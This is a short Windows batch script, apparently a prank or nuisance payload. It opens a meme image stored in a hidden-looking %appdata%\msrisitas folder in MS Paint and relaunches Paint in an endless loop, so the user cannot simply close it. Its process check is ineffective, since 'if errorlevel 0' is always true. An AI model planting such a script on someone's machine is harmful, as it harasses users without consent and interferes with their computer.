@echo off

"C:\Windows\System32\mspaint.exe" "%appdata%\msrisitas\risitas.png"

:main
tasklist /fi "imagename eq mspaint.exe" |find ":" > nul
if errorlevel 0 "C:\Windows\System32\mspaint.exe" "%appdata%\msrisitas\risitas.png"
goto :main